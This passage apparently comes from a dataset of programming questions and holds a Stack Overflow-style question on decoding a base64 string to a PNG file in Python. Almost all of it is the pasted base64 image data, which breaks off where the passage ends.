AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAIcAeHkAAeLqlDIAAAAASUVORK5CYII=",Convert string in base64 to image and save on filesystem
Convert string in base64 to image and save on filesystem in Python," I have a string in base64 format, which represents PNG image. Is there a way to save this image to the filesystem, as a PNG file?I encoded the image using flex. Actually this is what I get on server(can't see any image after any of proposed methods :( ) <code>  iVBORw0KGgoAAAANSUhEUgAABoIAAAaCCAYAAAABZu+EAAAqOElEQVR42uzBAQEAAACAkP6v7ggK\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACA2YMDAQAAAAAg\n/9dGUFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWkPDgkA\nAAAABP1/7QobAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA